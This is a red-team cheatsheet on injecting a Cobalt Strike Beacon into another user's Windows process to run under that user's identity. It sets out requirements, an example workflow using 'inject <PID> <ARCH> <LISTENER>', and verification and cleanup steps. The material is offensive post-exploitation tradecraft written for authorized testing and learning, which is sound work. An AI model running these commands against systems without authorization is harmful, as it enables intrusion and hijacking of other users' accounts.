---
title: "Process Injection with Cobalt Strike"
description: "Compare process injection with token impersonation, select an accessible process and matching architecture, and verify the new Beacon context."
category: "User Impersonation"
tools: ["Cobalt Strike"]
updated: "2026-11-10"
tags: ["impersonation", "process-injection", "windows"]
draft: false
---

## 1. Process identity and access tokens

Windows assigns a primary access token to a process. The token describes its user, groups, privileges, integrity level and associated logon session. Code running inside that process normally executes in its security context, subject to any thread impersonation.

Injecting Beacon into an existing process places a new Beacon in that process's address space. The resulting session uses the host process context; the original Beacon remains a separate session. This does not automatically grant privileges beyond those of the target context.

## 2. Injection versus token impersonation

| Property | `steal_token <PID>` | `inject <PID> <ARCH> <LISTENER>` |
|---|---|---|
| Current Beacon | Uses an impersonation token | Remains in its original process |
| New Beacon | Not created by this command | Runs inside the selected process |
| Identity source | Selected process token | Host process security context |
| Returning the original Beacon | `rev2self` ends impersonation | Original Beacon remains independently available |
| Lifetime | Current impersonation state | Depends on host process and Beacon lifetime |

Injection is not a permanent change to the account. The injected Beacon depends on its host process remaining alive. `rev2self` in the original Beacon does not remove code from another process.

## 3. Requirements and process selection

The source example uses a high-integrity session to access another user's process. Actual permissions and process protections determine whether injection is possible. A high-integrity token alone does not guarantee access to every process.

| Check | Purpose |
|---|---|
| Owner and PID | Select the intended process from the current list |
| Process architecture | Use a compatible `x86` or `x64` payload |
| Listener | Select an existing configured listener |
| Process lifetime | A process that exits also ends its hosted Beacon |
| Connectivity | The resulting Beacon must reach its configured listener |

## 4. Example workflow

Run these commands in the **original Beacon**. `http` is the example listener name; replace it with a configured listener. PID `5248` is an example from the notes, not a reusable target identifier.

```shell
# Record the original context
getuid

# Identify the current process owner, PID and architecture
ps
# Example: 5248 | cmd.exe | x64 | CONTOSO\rsteel

# Inject the payload for the configured listener into the selected process
inject 5248 x64 http
# A tasking message is not proof that a new Beacon connected
```

When the new Beacon appears, select it and verify the context there:

```shell
# Run in the NEW Beacon
getuid
# Expected in the example: CONTOSO\rsteel

# Confirm host and local identity
shell hostname
shell whoami
```

An account name alone does not establish administrative privileges or remote access. As described in the index notes, network authentication depends on the logon session and credentials associated with the effective token.

## 5. Troubleshooting and ending the session

| Symptom | What to check |
|---|---|
| Injection is denied | Access rights, integrity and target process protections |
| No new Beacon arrives | Actual PID, architecture, listener, connectivity and process lifetime |
| Identity is unexpected | Selected Beacon, target owner and effective thread context |
| Original Beacon still shows the original user | Expected: injection creates a separate Beacon |
| New Beacon disconnects | Host process lifetime and listener connectivity |

To end the test Beacon, select that Beacon and use the supported session exit command. Do not kill an unrelated user's host process as a default cleanup action.

```shell
# In the injected test Beacon, when finished
exit
```

Reference for injection behavior: [Cobalt Strike session passing](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/post-exploitation_session-passing.htm).

## 6. Quick checklist

```text
ORIGINAL BEACON
[ ] getuid → record the initial identity
[ ] ps → select the current target PID, owner and architecture
[ ] Confirm process access and an existing configured listener
[ ] inject <PID> <x86|x64> <LISTENER>
[ ] Confirm that a new Beacon actually connects

NEW BEACON
[ ] Select the new Beacon before checking its context
[ ] getuid → verify the resulting identity
[ ] shell hostname → confirm the host
[ ] shell whoami → inspect local execution identity
[ ] Distinguish local identity from available network credentials

ENDING THE TEST
[ ] Select the injected test Beacon
[ ] exit → end that Beacon using its supported session command
[ ] Return to the original Beacon and run getuid
[ ] Do not assume rev2self in the original Beacon removes the injected Beacon
```

## Related references

- [Token impersonation](/cheatsheets/token-impersonation-cobalt-cheatsheet/)
- [Pass the Hash](/cheatsheets/pass-the-hash-cobalt-cheatsheet/)
- [Pass the Ticket](/cheatsheets/pass-the-ticket-cobalt-cheatsheet/)
